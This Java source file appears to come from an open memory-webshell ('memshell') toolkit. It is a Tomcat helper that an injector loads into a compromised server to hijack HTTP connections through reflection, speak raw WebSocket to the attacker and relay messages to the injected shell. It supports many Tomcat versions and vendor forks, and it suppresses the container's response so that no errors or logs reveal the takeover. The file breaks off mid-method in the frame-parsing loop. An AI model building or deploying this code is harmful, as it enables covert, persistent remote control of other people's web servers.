package com.reajason.javaweb.memshell.server.tomcat;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.SocketTimeoutException;
import java.nio.ByteBuffer;
import java.nio.channels.ClosedChannelException;
import java.nio.channels.Selector;
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;

/**
 * Tomcat RawWebSocket helper 模板。
 * <p>
 * 生成期由 server 按 {@code <shellClassName>$RawWsHelper} 重命名并嵌入注入器；注入器先
 * defineClass 本类，再实例化 shell。shell 每次握手创建一个 helper 实例，调用
 * {@code helper.equals(new Object[]{request, response, this})} 后由本类接管连接：
 * 反射取出 coyote 连接对象，写 101，跑帧循环，并反射调用 shell 的协议回调。
 * <p>
 * 覆盖 Tomcat 全部 I/O 实现：5/6/7/8.0 的 BIO 裸流、8.5+ 的 SocketWrapperBase
 * （NIO/NIO2/APR）、7/8.0 的 APR JNI socket、7/8.0 的 NioSelectorPool、8.0 的 Nio2Channel。
 * <p>
 * BES / TongWeb 等 Tomcat 分支把 coyote 包名整体重命名，这里不写死分支类名：
 * ActionCode 从 {@code Response.action} 的形参反查，NioSelectorPool 的 read/write
 * 按方法签名匹配，BIO/APR/SocketWrapper 按 buffer 字段结构识别。
 * <p>
 * 本类只依赖 JDK（目标 JDK 6），不引用任何 servlet 类型，便于后续复用同一份代码
 * 服务 javax/jakarta 两种命名空间。
 *
 * @author ReaJason
 */
public class TomcatRawWsHelper implements Runnable {

    private static final String GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final int MAX_MESSAGE_SIZE = 50 * 1024 * 1024;
    private static final int OP_CONT = 0x0;
    private static final int OP_TEXT = 0x1;
    private static final int OP_BINARY = 0x2;
    private static final int OP_CLOSE = 0x8;
    private static final int OP_PING = 0x9;
    private static final int OP_PONG = 0xA;

    /**
     * 阻塞读的超时：连接空闲时定期醒来检查 closed，让泵线程关闭的连接能退出帧循环。
     */
    private static final int READ_POLL_TIMEOUT = 5000;
    private static final int IO_BUFFER_SIZE = 8192;
    private static final long APR_INFINITE_TIMEOUT = READ_POLL_TIMEOUT * 1000L;

    private static final int MODE_NONE = 0;
    private static final int MODE_BIO = 1;
    private static final int MODE_WRAPPER = 2;
    private static final int MODE_APR = 3;
    private static final int MODE_NIO8 = 4;
    private static final int MODE_NIO2_8 = 5;

    private int wireMode = MODE_NONE;
    private final byte[] singleByte = new byte[1];
    /**
     * 已从连接读出但尚未消费的字节：初始为容器解析握手请求时多读的部分，之后复用为
     * 帧头/掩码读取的内部缓冲。BIO/APR/NIO2 等模式没有容器读缓冲，逐字节读时一次填满，
     * 避免每个字节一次 read 系统调用。
     */
    private byte[] pending;
    private int pendingIndex;
    private int pendingLength;

    private InputStream input;
    private OutputStream output;

    private Object wrapper;
    private Method wrapperRead;
    private Method wrapperWrite;
    private Method wrapperFlush;
    private Method wrapperClose;
    private Method wrapperTakeProcessor;

    private Object nioPool;
    private Object nioChannel;
    private ByteBuffer nioReadBuffer;
    private byte[] nioPending;
    private int nioPendingIndex;
    private Method nioPoolGet;
    private Method nioPoolPut;
    private Method nioPoolRead;
    private Method nioPoolWrite;
    private Method nioChannelFlush;
    private Method nioChannelClose;

    private Object nio2Channel;
    private Method nio2Read;
    private Method nio2Write;
    private Method nio2Flush;
    private Method nio2Close;

    private long aprSocket;
    private Method aprRecv;
    private Method aprSend;
    private Method aprTimeoutSet;
    private Method aprShutdown;
    private int aprEagain;
    private int aprTimeup;
    private int aprEtimedout;

    private Object coyoteResponse;

    private final Object writeLock = new Object();
    private volatile boolean closed;
    private Object shell;
    private Method onStart;
    private Method onReadBinary;
    private Method onReadText;
    private Method onDisconnect;
    private InputStream pumpInput;
    private Map attributes;
    private boolean hijacked;

    public TomcatRawWsHelper() {
    }

    /**
     * 注入器到 helper 的唯一入口。返回 true 表示连接已被接管（101 已决定写或已写），
     * 调用方不能再回落到 FilterChain；返回 false 表示尚未接管，可安全 fallback。
     */
    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Object[])) {
            return false;
        }
        Object[] args = (Object[]) obj;
        if (args.length != 3) {
            return false;
        }
        try {
            return connect(args[0], args[1], args[2]);
        } catch (Throwable ignored) {
            return hijacked;
        }
    }

    private boolean connect(Object request, Object response, Object shellObject) throws Exception {
        Object coyoteResponse = getResponseCoyote(response);
        Object inputBuffer = getField(getRequestCoyote(request), "inputBuffer");
        Object outputBuffer = getField(coyoteResponse, "outputBuffer");
        if (inputBuffer == null || outputBuffer == null) {
            return false;
        }
        Object key = invoke(request, "getHeader", new Class[]{String.class}, new Object[]{"Sec-WebSocket-Key"});
        Object method = invoke(request, "getMethod", new Class[0], null);
        if (!(key instanceof String) || !"GET".equalsIgnoreCase(String.valueOf(method))) {
            return false;
        }
        String accept = acceptKey((String) key);
        if (accept == null) {
            return false;
        }

        if (!initBio(inputBuffer, outputBuffer)
                && !initWrapper(inputBuffer, outputBuffer)
                && !initApr(inputBuffer, outputBuffer)
                && !initNio8(inputBuffer, outputBuffer)
                && !initNio2_8(inputBuffer, outputBuffer)) {
            return false;
        }

        // 头部解析可能把首个 WebSocket 帧一起读进容器缓冲区，必须先取出来再接管裸连接
        this.pending = extractLeftover(inputBuffer);
        this.pendingLength = pending == null ? 0 : pending.length;
        this.coyoteResponse = coyoteResponse;
        this.shell = shellObject;
        this.onStart = findMethod(shellObject, "onStart", new Class[]{Object.class});
        this.onReadBinary = findMethod(shellObject, "onReadBinary", new Class[]{Object.class, byte[].class});
        this.onReadText = findMethod(shellObject, "onReadText", new Class[]{Object.class, String.class});
        this.onDisconnect = findMethod(shellObject, "onDisconnect", new Class[]{Object.class});

        if (wireMode == MODE_BIO) {
            // 接管后把容器对流的引用换成空流：doFilter 返回时 processor 还会 flush/commit，
            // 置 null 会让 InternalOutputBuffer.realWriteBytes NPE，空流则把这些收尾写入吞掉。
            setField(inputBuffer, "inputStream", new ByteArrayInputStream(new byte[0]));
            setField(outputBuffer, "outputStream", new ByteArrayOutputStream());
        }
        this.hijacked = true;

        try {
            writeHandshake(accept);
        } catch (Throwable t) {
            suppressContainerResponse();
            closeConnection();
            return true;
        }
        invokeQuietly(onStart, shell, new Object[]{this});
        try {
            frameLoop();
        } catch (Throwable ignored) {
        } finally {
            invokeQuietly(onDisconnect, shell, new Object[]{this});
            suppressContainerResponse();
            closeConnection();
        }
        return true;
    }

    // ---------------------------------------------------------------- 连接后端

    /**
     * Tomcat 5/6/7/8.0 BIO：coyote buffer 直接持有 socket 的裸输入输出流。
     */
    private boolean initBio(Object inputBuffer, Object outputBuffer) {
        if (!inputBuffer.getClass().getName().endsWith("InternalInputBuffer")
                || !outputBuffer.getClass().getName().endsWith("InternalOutputBuffer")) {
            return false;
        }
        Object in = getField(inputBuffer, "inputStream");
        Object out = getField(outputBuffer, "outputStream");
        if (!(in instanceof InputStream) || !(out instanceof OutputStream)) {
            return false;
        }
        this.input = (InputStream) in;
        this.output = (OutputStream) out;
        this.wireMode = MODE_BIO;
        return true;
    }

    /**
     * Tomcat 8.5+：Http11InputBuffer.wrapper / Http11OutputBuffer.socketWrapper，
     * 都用 SocketWrapperBase 的阻塞读写，NIO/NIO2/APR 实现一致。
     */
    private boolean initWrapper(Object inputBuffer, Object outputBuffer) {
        Object candidate = getField(inputBuffer, "wrapper");
        if (candidate == null) {
            candidate = getField(outputBuffer, "socketWrapper");
        }
        if (candidate == null) {
            candidate = getField(inputBuffer, "socketWrapper");
        }
        if (candidate == null) {
            return false;
        }
        Method read = findMethod(candidate, "read",
                new Class[]{boolean.class, byte[].class, int.class, int.class});
        Method write = findMethod(candidate, "write",
                new Class[]{boolean.class, byte[].class, int.class, int.class});
        Method flush = findMethod(candidate, "flush", new Class[]{boolean.class});
        Method close = findMethod(candidate, "close", new Class[0]);
        if (read == null || write == null || flush == null || close == null) {
            return false;
        }
        this.wrapper = candidate;
        this.wrapperRead = read;
        this.wrapperWrite = write;
        this.wrapperFlush = flush;
        this.wrapperClose = close;
        this.wrapperTakeProcessor = findMethod(candidate, "takeCurrentProcessor", new Class[0]);
        invoke(candidate, "setReadTimeout", new Class[]{long.class},
                new Object[]{Long.valueOf(READ_POLL_TIMEOUT)});
        invoke(candidate, "setWriteTimeout", new Class[]{long.class},
                new Object[]{Long.valueOf(READ_POLL_TIMEOUT)});
        this.wireMode = MODE_WRAPPER;
        return true;
    }

    /**
     * Tomcat 7/8.0 APR：coyote buffer 里是 APR 的 long socket 句柄，直接走 Tomcat 自带的 JNI。
     */
    private boolean initApr(Object inputBuffer, Object outputBuffer) {
        if (inputBuffer.getClass().getName().indexOf("InternalApr") < 0
                || outputBuffer.getClass().getName().indexOf("InternalApr") < 0) {
            return false;
        }
        Object socketValue = getField(inputBuffer, "socket");
        if (!(socketValue instanceof Long)) {
            return false;
        }
        try {
            Class socketClass = Class.forName("org.apache.tomcat.jni.Socket");
            Class statusClass = Class.forName("org.apache.tomcat.jni.Status");
            this.aprRecv = socketClass.getMethod("recv",
                    new Class[]{long.class, byte[].class, int.class, int.class});
            this.aprSend = socketClass.getMethod("send",
                    new Class[]{long.class, byte[].class, int.class, int.class});
            this.aprTimeoutSet = socketClass.getMethod("timeoutSet",
                    new Class[]{long.class, long.class});
            this.aprShutdown = socketClass.getMethod("shutdown",
                    new Class[]{long.class, int.class});
            this.aprEagain = statusClass.getField("EAGAIN").getInt(null);
            this.aprTimeup = statusClass.getField("TIMEUP").getInt(null);
            this.aprEtimedout = statusClass.getField("ETIMEDOUT").getInt(null);
            this.aprSocket = ((Long) socketValue).longValue();
            this.aprTimeoutSet.invoke(null, new Object[]{
                    Long.valueOf(aprSocket), Long.valueOf(APR_INFINITE_TIMEOUT)});
        } catch (Throwable t) {
            this.aprSocket = 0L;
            return false;
        }
        this.wireMode = MODE_APR;
        return true;
    }

    /**
     * Tomcat 8.0 NIO：coyote buffer 持有 NioChannel 和 NioSelectorPool。
     */
    private boolean initNio8(Object inputBuffer, Object outputBuffer) {
        Object channel = getField(inputBuffer, "socket");
        Object pool = getField(inputBuffer, "pool");
        if (channel == null || pool == null
                || channel.getClass().getName().indexOf("NioChannel") < 0
                || pool.getClass().getName().indexOf("NioSelectorPool") < 0) {
            return false;
        }
        try {
            // BES/TongWeb 等分支把 NioChannel/NioSelectorPool 一起改了包名，不能按
            // org.apache.tomcat.util.net.NioChannel 写死；pool 的 read/write 形参是
            // 该分支自己的 channel 基类，直接从方法签名反查
            this.nioPoolGet = pool.getClass().getMethod("get", new Class[0]);
            this.nioPoolPut = pool.getClass().getMethod("put", new Class[]{Selector.class});
            this.nioPoolRead = findPoolIo(pool.getClass(), "read", channel.getClass());
            this.nioPoolWrite = findPoolIo(pool.getClass(), "write", channel.getClass());
            if (this.nioPoolRead == null || this.nioPoolWrite == null) {
                return false;
            }
            this.nioChannelFlush = channel.getClass().getMethod("flush",
                    new Class[]{boolean.class, Selector.class, long.class});
            this.nioChannelClose = channel.getClass().getMethod("close", new Class[0]);
            // TLS channel 的 read 只接受 bufHandler 自带的读缓冲（SecureNioChannel 有 identity 校验），
            // 普通 NioChannel 用同一块缓冲也无害；多读出来的字节由 nioPending 暂存。
            Object bufferHandler = invoke(channel, "getBufHandler", new Class[0], null);
            Object readBuffer = bufferHandler == null ? null
                    : invoke(bufferHandler, "getReadBuffer", new Class[0], null);
            this.nioReadBuffer = readBuffer instanceof ByteBuffer ? (ByteBuffer) readBuffer : null;
            if (this.nioReadBuffer == null && channel.getClass().getName().indexOf("Secure") >= 0) {
                // SecureNioChannel.read 有 dst identity 校验，拿不到读缓冲就不要假装接管成功
                return false;
            }
        } catch (Throwable t) {
            return false;
        }
        this.nioPool = pool;
        this.nioChannel = channel;
        this.wireMode = MODE_NIO8;
        return true;
    }

    /**
     * 从 pool 的实现里找阻塞读写方法：形参顺序固定，channel 参数是具体分支的基类
     * （运行时对象可能是其 Secure 子类，所以只能按 isAssignableFrom 匹配）。
     */
    private static Method findPoolIo(Class poolClass, String name, Class channelClass) {
        Method[] methods = poolClass.getMethods();
        for (int i = 0; i < methods.length; i++) {
            Method method = methods[i];
            if (!name.equals(method.getName())) {
                continue;
            }
            Class[] parameterTypes = method.getParameterTypes();
            if (parameterTypes.length == 5
                    && parameterTypes[0] == ByteBuffer.class
                    && parameterTypes[1].isAssignableFrom(channelClass)
                    && parameterTypes[2] == Selector.class
                    && parameterTypes[3] == long.class
                    && parameterTypes[4] == boolean.class) {
                return method;
            }
        }
        return null;
    }

    /**
     * Tomcat 8.0 NIO2：coyote buffer 持有 SocketWrapper&lt;Nio2Channel&gt;，channel 的
     * read/write/flush 都是异步 Future，阻塞 get() 即可当同步连接用。
     */
    private boolean initNio2_8(Object inputBuffer, Object outputBuffer) {
        if (inputBuffer.getClass().getName().indexOf("InternalNio2") < 0
                || outputBuffer.getClass().getName().indexOf("InternalNio2") < 0) {
            return false;
        }
        Object socketWrapper = getField(inputBuffer, "socket");
        if (socketWrapper == null) {
            return false;
        }
        Object channel = invoke(socketWrapper, "getSocket", new Class[0], null);
        if (channel == null || channel.getClass().getName().indexOf("Nio2Channel") < 0) {
            return false;
        }
        try {
            // 同上：分支可能把 Nio2Channel 改了包名，按运行时类型取方法即可
            this.nio2Read = channel.getClass().getMethod("read", new Class[]{ByteBuffer.class});
            this.nio2Write = channel.getClass().getMethod("write", new Class[]{ByteBuffer.class});
            this.nio2Flush = channel.getClass().getMethod("flush", new Class[0]);
            this.nio2Close = channel.getClass().getMethod("close", new Class[0]);
        } catch (Throwable t) {
            return false;
        }
        this.nio2Channel = channel;
        this.wireMode = MODE_NIO2_8;
        return true;
    }

    // ---------------------------------------------------------------- 原始字节读写

    private int readWire(byte[] buffer, int offset, int length) throws IOException {
        if (length <= 0) {
            return 0;
        }
        // 帧头和掩码按单字节读取；一次读满内部缓冲后再逐字节消费，避免每个字节一次
        // read 调用（BIO/APR/NIO2 都是直达连接，没有容器读缓冲）。payload 等大块读取
        // 直接落到调用方缓冲区；WRAPPER/NIO8 内部本来就有 8K 读缓冲，这里只是少几次调用。
        if (pendingIndex >= pendingLength && length == 1) {
            if (pending == null || pending.length < IO_BUFFER_SIZE) {
                pending = new byte[IO_BUFFER_SIZE];
            }
            int count = readWireDirect(pending, 0, pending.length);
            if (count <= 0) {
                return count;
            }
            pendingLength = count;
            pendingIndex = 0;
        }
        if (pendingIndex < pendingLength) {
            int count = pendingLength - pendingIndex;
            if (count > length) {
                count = length;
            }
            System.arraycopy(pending, pendingIndex, buffer, offset, count);
            pendingIndex += count;
            return count;
        }
        return readWireDirect(buffer, offset, length);
    }

    private int readWireDirect(byte[] buffer, int offset, int length) throws IOException {
        if (wireMode == MODE_BIO) {
            return input.read(buffer, offset, length);
        }
        if (wireMode == MODE_WRAPPER) {
            return readWrapper(buffer, offset, length);
        }
        if (wireMode == MODE_APR) {
            return readApr(buffer, offset, length);
        }
        if (wireMode == MODE_NIO8) {
            return readNio8(buffer, offset, length);
        }
        if (wireMode == MODE_NIO2_8) {
            return readNio2(buffer, offset, length);
        }
        return -1;
    }

    private int readWireByte() throws IOException {
        while (!closed) {
            int count = readWire(singleByte, 0, 1);
            if (count > 0) {
                return singleByte[0] & 0xFF;
            }
            if (count < 0) {
                return -1;
            }
            // 超时或暂时无数据，回到循环顶检查 closed
        }
        return -1;
    }

    private void readFully(byte[] buffer, int offset, int length) throws IOException {
        int read = 0;
        while (read < length) {
            int count = readWire(buffer, offset + read, length - read);
            if (count < 0) {
                throw new IOException("unexpected EOF");
            }
            if (count == 0) {
                if (closed) {
                    throw new IOException("connection closed");
                }
                continue;
            }
            read += count;
        }
    }

    private int readWrapper(byte[] buffer, int offset, int length) throws IOException {
        try {
            Object result = wrapperRead.invoke(wrapper, new Object[]{
                    Boolean.TRUE, buffer, Integer.valueOf(offset), Integer.valueOf(length)});
            return result instanceof Integer ? ((Integer) result).intValue() : -1;
        } catch (InvocationTargetException e) {
            Throwable cause = e.getCause();
            if (cause instanceof SocketTimeoutException) {
                return 0;
            }
            if (cause instanceof EOFException || cause instanceof ClosedChannelException) {
                return -1;
            }
            if (closed) {
                return -1;
            }
            if (cause instanceof IOException) {
                throw (IOException) cause;
            }
            throw new IOException("wrapper read failed: " + cause);
        } catch (Throwable t) {
            if (closed) {
                return -1;
            }
            throw new IOException("wrapper read failed: " + t);
        }
    }

    private int readApr(byte[] buffer, int offset, int length) throws IOException {
        try {
            Object result = aprRecv.invoke(null, new Object[]{
                    Long.valueOf(aprSocket), buffer, Integer.valueOf(offset), Integer.valueOf(length)});
            int count = result instanceof Integer ? ((Integer) result).intValue() : -1;
            if (count > 0) {
                return count;
            }
            if (count == 0 || count == -1) {
                return -1;
            }
            int status = -count;
            if (status == aprEagain || status == aprTimeup || status == aprEtimedout) {
                return 0;
            }
            if (status == 70014) {
                // APR_EOF
                return -1;
            }
            throw new IOException("apr read failed: " + count);
        } catch (InvocationTargetException e) {
            if (closed) {
                return -1;
            }
            throw new IOException("apr read failed: " + e.getCause());
        } catch (Throwable t) {
            if (closed) {
                return -1;
            }
            throw new IOException("apr read failed: " + t);
        }
    }

    private int readNio8(byte[] buffer, int offset, int length) throws IOException {
        if (nioPending != null && nioPendingIndex < nioPending.length) {
            int count = Math.min(length, nioPending.length - nioPendingIndex);
            System.arraycopy(nioPending, nioPendingIndex, buffer, offset, count);
            nioPendingIndex += count;
            return count;
        }
        Selector selector = null;
        try {
            selector = (Selector) nioPoolGet.invoke(nioPool);
            if (selector == null) {
                throw new IOException("nio8 selector unavailable");
            }
            ByteBuffer target = nioReadBuffer;
            if (target == null) {
                target = ByteBuffer.wrap(buffer, offset, length);
            } else {
                target.clear();
            }
            int count = ((Integer) nioPoolRead.invoke(nioPool, new Object[]{
                    target, nioChannel, selector,
                    Long.valueOf(READ_POLL_TIMEOUT), Boolean.TRUE})).intValue();
            if (count <= 0) {
                return count;
            }
            if (target == nioReadBuffer) {
                target.flip();
                int copied = Math.min(length, count);
                target.get(buffer, offset, copied);
                if (copied < count) {
                    byte[] pending = new byte[count - copied];
                    target.get(pending);
                    this.nioPending = pending;
                    this.nioPendingIndex = 0;
                }
                return copied;
            }
            return count;
        } catch (InvocationTargetException e) {
            Throwable cause = e.getCause();
            if (cause instanceof SocketTimeoutException) {
                return 0;
            }
            if (cause instanceof EOFException) {
                return -1;
            }
            if (closed) {
                return -1;
            }
            throw new IOException("nio8 read failed: " + cause);
        } catch (Throwable t) {
            if (closed) {
                return -1;
            }
            if (t instanceof IOException) {
                throw (IOException) t;
            }
            throw new IOException("nio8 read failed: " + t);
        } finally {
            if (selector != null) {
                try {
                    nioPoolPut.invoke(nioPool, new Object[]{selector});
                } catch (Throwable ignored) {
                }
            }
        }
    }

    private int readNio2(byte[] buffer, int offset, int length) throws IOException {
        try {
            Future future = (Future) nio2Read.invoke(nio2Channel, new Object[]{
                    ByteBuffer.wrap(buffer, offset, length)});
            Object result = future.get();
            return result instanceof Integer ? ((Integer) result).intValue() : -1;
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return -1;
        } catch (ExecutionException e) {
            Throwable cause = e.getCause();
            if (cause instanceof EOFException || cause instanceof ClosedChannelException) {
                return -1;
            }
            if (closed) {
                return -1;
            }
            if (cause instanceof IOException) {
                throw (IOException) cause;
            }
            throw new IOException("nio2 read failed: " + cause);
        } catch (InvocationTargetException e) {
            if (closed) {
                return -1;
            }
            Throwable cause = e.getCause();
            if (cause instanceof EOFException || cause instanceof ClosedChannelException) {
                return -1;
            }
            throw new IOException("nio2 read failed: " + cause);
        } catch (Throwable t) {
            if (closed) {
                return -1;
            }
            throw new IOException("nio2 read failed: " + t);
        }
    }

    private void writeWire(byte[] data, int offset, int length) throws IOException {
        if (length <= 0) {
            return;
        }
        if (wireMode == MODE_BIO) {
            output.write(data, offset, length);
            return;
        }
        if (wireMode == MODE_WRAPPER) {
            writeWrapper(data, offset, length);
            return;
        }
        if (wireMode == MODE_APR) {
            writeApr(data, offset, length);
            return;
        }
        if (wireMode == MODE_NIO8) {
            writeNio8(data, offset, length);
            return;
        }
        if (wireMode == MODE_NIO2_8) {
            writeNio2(data, offset, length);
        }
    }

    private void writeWrapper(byte[] data, int offset, int length) throws IOException {
        try {
            wrapperWrite.invoke(wrapper, new Object[]{
                    Boolean.TRUE, data, Integer.valueOf(offset), Integer.valueOf(length)});
        } catch (InvocationTargetException e) {
            throw new IOException("wrapper write failed: " + e.getCause());
        } catch (Throwable t) {
            throw new IOException("wrapper write failed: " + t);
        }
    }

    private void writeApr(byte[] data, int offset, int length) throws IOException {
        int off = offset;
        int remaining = length;
        while (remaining > 0) {
            try {
                Object result = aprSend.invoke(null, new Object[]{
                        Long.valueOf(aprSocket), data, Integer.valueOf(off), Integer.valueOf(remaining)});
                int count = result instanceof Integer ? ((Integer) result).intValue() : -1;
                if (count > 0) {
                    off += count;
                    remaining -= count;
                    continue;
                }
                int status = -count;
                if (status == aprEagain || status == aprTimeup || status == aprEtimedout) {
                    // 发送缓冲满或超时都可重试；立即 continue 会 100% 空转，先让出 CPU
                    if (closed) {
                        throw new IOException("connection closed");
                    }
                    try {
                        Thread.sleep(1);
                    } catch (InterruptedException e) {
                        throw new IOException("apr write interrupted");
                    }
                    continue;
                }
                throw new IOException("apr write failed: " + count);
            } catch (InvocationTargetException e) {
                throw new IOException("apr write failed: " + e.getCause());
            } catch (IOException e) {
                throw e;
            } catch (Throwable t) {
                throw new IOException("apr write failed: " + t);
            }
        }
    }

    private void writeNio8(byte[] data, int offset, int length) throws IOException {
        Selector selector = null;
        try {
            selector = (Selector) nioPoolGet.invoke(nioPool);
            if (selector == null) {
                throw new IOException("nio8 selector unavailable");
            }
            ByteBuffer target = ByteBuffer.wrap(data, offset, length);
            while (target.hasRemaining()) {
                int written = ((Integer) nioPoolWrite.invoke(nioPool, new Object[]{
                        target, nioChannel, selector, Long.valueOf(READ_POLL_TIMEOUT),
                        Boolean.TRUE})).intValue();
                if (written <= 0 && closed) {
                    throw new IOException("connection closed");
                }
            }
            while (!Boolean.TRUE.equals(nioChannelFlush.invoke(nioChannel, new Object[]{
                    Boolean.TRUE, selector, Long.valueOf(READ_POLL_TIMEOUT)}))) {
                if (closed) {
                    throw new IOException("connection closed");
                }
            }
        } catch (InvocationTargetException e) {
            throw new IOException("nio8 write failed: " + e.getCause());
        } catch (IOException e) {
            throw e;
        } catch (Throwable t) {
            throw new IOException("nio8 write failed: " + t);
        } finally {
            if (selector != null) {
                try {
                    nioPoolPut.invoke(nioPool, new Object[]{selector});
                } catch (Throwable ignored) {
                }
            }
        }
    }

    private void writeNio2(byte[] data, int offset, int length) throws IOException {
        ByteBuffer target = ByteBuffer.wrap(data, offset, length);
        try {
            while (target.hasRemaining()) {
                Future future = (Future) nio2Write.invoke(nio2Channel, new Object[]{target});
                Object result;
                try {
                    // 写不能无限等：对端不读且缓冲满时 get() 会永远挂住泵线程
                    result = future.get(READ_POLL_TIMEOUT, java.util.concurrent.TimeUnit.MILLISECONDS);
                } catch (java.util.concurrent.TimeoutException e) {
                    future.cancel(true);
                    throw new IOException("nio2 write timeout");
                }
                int written = result instanceof Integer ? ((Integer) result).intValue() : -1;
                if (written <= 0) {
                    throw new IOException("nio2 write failed: " + written);
                }
            }
            Object flushed = ((Future) nio2Flush.invoke(nio2Channel, new Object[0])).get();
            if (Boolean.FALSE.equals(flushed)) {
                throw new IOException("nio2 flush failed");
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new IOException("nio2 write interrupted");
        } catch (ExecutionException e) {
            throw new IOException("nio2 write failed: " + e.getCause());
        } catch (InvocationTargetException e) {
            throw new IOException("nio2 write failed: " + e.getCause());
        } catch (IOException e) {
            throw e;
        } catch (Throwable t) {
            throw new IOException("nio2 write failed: " + t);
        }
    }

    private void flushWire() throws IOException {
        if (wireMode == MODE_BIO) {
            output.flush();
            return;
        }
        if (wireMode == MODE_WRAPPER) {
            try {
                wrapperFlush.invoke(wrapper, new Object[]{Boolean.TRUE});
            } catch (InvocationTargetException e) {
                throw new IOException("wrapper flush failed: " + e.getCause());
            } catch (Throwable t) {
                throw new IOException("wrapper flush failed: " + t);
            }
        }
        // APR 的 send 直接落 socket，8.0 NIO/NIO2 在 write 里已经 flush
    }

    /**
     * 把容器视角的响应收尾全部短路：committed 阻止再写状态行，CLOSE_NOW 让 processor
     * 跳过 endRequest/flush 并把连接标记为关闭。否则 doFilter 返回后 Tomcat 会往已经
     * 关闭的连接上补一个 HTTP 响应，产生异常和日志。
     */
    private void suppressContainerResponse() {
        if (wireMode == MODE_BIO || wireMode == MODE_NONE || coyoteResponse == null) {
            return;
        }
        try {
            coyoteResponse.getClass().getMethod("setCommitted", new Class[]{boolean.class})
                    .invoke(coyoteResponse, new Object[]{Boolean.TRUE});
        } catch (Throwable ignored) {
        }
        try {
            // BES/TongWeb 把 coyote 重打包到自己的包下，ActionCode 不能按 org.apache 写死；
            // 从 Response.action(ActionCode, Object) 的形参类型反查，Tomcat 系各分支通用
            Class actionCodeClass = findActionCodeClass(coyoteResponse.getClass());
            Object closeNow = null;
            Object[] constants = actionCodeClass == null ? null : actionCodeClass.getEnumConstants();
            if (constants != null) {
                for (int i = 0; i < constants.length; i++) {
                    if ("CLOSE_NOW".equals(String.valueOf(constants[i]))) {
                        closeNow = constants[i];
                        break;
                    }
                }
            }
            if (closeNow != null) {
                coyoteResponse.getClass().getMethod("action", new Class[]{actionCodeClass, Object.class})
                        .invoke(coyoteResponse, new Object[]{closeNow, null});
            }
        } catch (Throwable ignored) {
        }
    }

    private static Class findActionCodeClass(Class responseClass) {
        Method[] methods = responseClass.getMethods();
        for (int i = 0; i < methods.length; i++) {
            Method method = methods[i];
            if ("action".equals(method.getName())) {
                Class[] parameterTypes = method.getParameterTypes();
                if (parameterTypes.length == 2 && parameterTypes[0].isEnum()) {
                    return parameterTypes[0];
                }
            }
        }
        try {
            return Class.forName("org.apache.coyote.ActionCode");
        } catch (Throwable ignored) {
            return null;
        }
    }

    private void closeConnection() {
        if (closed) {
            return;
        }
        closed = true;
        if (wireMode == MODE_BIO) {
            try {
                if (output != null) {
                    output.close();
                }
            } catch (Throwable ignored) {
            }
            try {
                if (input != null) {
                    input.close();
                }
            } catch (Throwable ignored) {
            }
            return;
        }
        if (wireMode == MODE_WRAPPER) {
            // 正在请求线程里，currentProcessor 指向当前 processor；直接 close 会把 processor
            // 提前 recycle，导致 doFilter 返回后容器继续使用已被清空的 request/response。
            if (wrapperTakeProcessor != null) {
                invokeQuietly(wrapperTakeProcessor, wrapper, null);
            } else if (!detachProcessor()) {
                // 摘不掉当前 processor 就不显式 close：suppressContainerResponse 已置 CLOSE_NOW，
                // 容器会以错误状态结束请求并关闭连接，避免在这里提前 recycle。
                return;
            }
            try {
                wrapperClose.invoke(wrapper);
            } catch (Throwable ignored) {
            }
            return;
        }
        if (wireMode == MODE_APR) {
            try {
                aprShutdown.invoke(null, new Object[]{
                        Long.valueOf(aprSocket), Integer.valueOf(2)});
            } catch (Throwable ignored) {
            }
            return;
        }
        if (wireMode == MODE_NIO8) {
            try {
                nioChannelClose.invoke(nioChannel);
            } catch (Throwable ignored) {
            }
            return;
        }
        if (wireMode == MODE_NIO2_8) {
            try {
                nio2Close.invoke(nio2Channel);
            } catch (Throwable ignored) {
            }
        }
    }

    /**
     * BES/TongWeb 的 SocketWrapperBase 没有 takeCurrentProcessor，close() 时
     * ConnectionHandler.release(SocketWrapperBase) 按 socket 从 connections 中取 processor
     * 并 recycle，不检查 currentProcessor。显式 close 前先把当前连接对应的 processor
     * 从映射里摘掉，它仍由 ConnectionHandler.process 的局部变量持有，请求结束时会正常回收。
     */
    private boolean detachProcessor() {
        Object endpoint = getField(wrapper, "endpoint");
        Object handler = getField(endpoint, "handler");
        Object connections = getField(handler, "connections");
        Object socket = invoke(wrapper, "getSocket", new Class[0], null);
        if (!(connections instanceof Map) || socket == null) {
            return false;
        }
        try {
            ((Map) connections).remove(socket);
            return true;
        } catch (Throwable ignored) {
            return false;
        }
    }

    // ---------------------------------------------------------------- 协议

    private void writeHandshake(String accept) throws IOException {
        String response = "HTTP/1.1 101 Switching Protocols\r\n"
                + "Upgrade: websocket\r\n"
                + "Connection: Upgrade\r\n"
                + "X-Accel-Buffering: no\r\n"
                + "Sec-WebSocket-Accept: " + accept + "\r\n"
                + "\r\n";
        byte[] data = response.getBytes(UTF8);
        synchronized (writeLock) {
            writeWire(data, 0, data.length);
            flushWire();
        }
    }

    private void frameLoop() {
        ByteArrayOutputStream fragments = null;
        int fragmentOpcode = -1;
        try {
            while (!closed) {
                int b1 = readWireByte();
                if (b1 == -1) {
                    break;
                }
                boolean fin = (b1 & 0x80) != 0;
                int opcode = b1 & 0x0F;
                if ((b1 & 0x70) != 0) {
                    closeWith(1002, "unexpected reserved bits");
                    return;
                }

                int b2 = readWireByte();
                if (b2 == -1) {
                    break;
                }
                boolean masked = (b2 & 0x80) != 0;
                long length = b2 & 0x7F;
                if (length == 126) {
                    int hi = readWireByte();
                    int lo = readWireByte();
                    // EOF 时直接结束：-1 折进长度算术会算出畸形长度
                    if (hi < 0 || lo < 0) {
                        return;
                    }
                    length = (hi << 8) | lo;
                } else if (length == 127) {
                    length = 0;
                    for (int i = 0; i < 8; i++) {
                        int b = readWireByte();
                        if (b < 0) {
                            return;
                        }
                        length = (length << 8) | b;
                    }
                }
                if (length < 0 || length > MAX_MESSAGE_SIZE) {
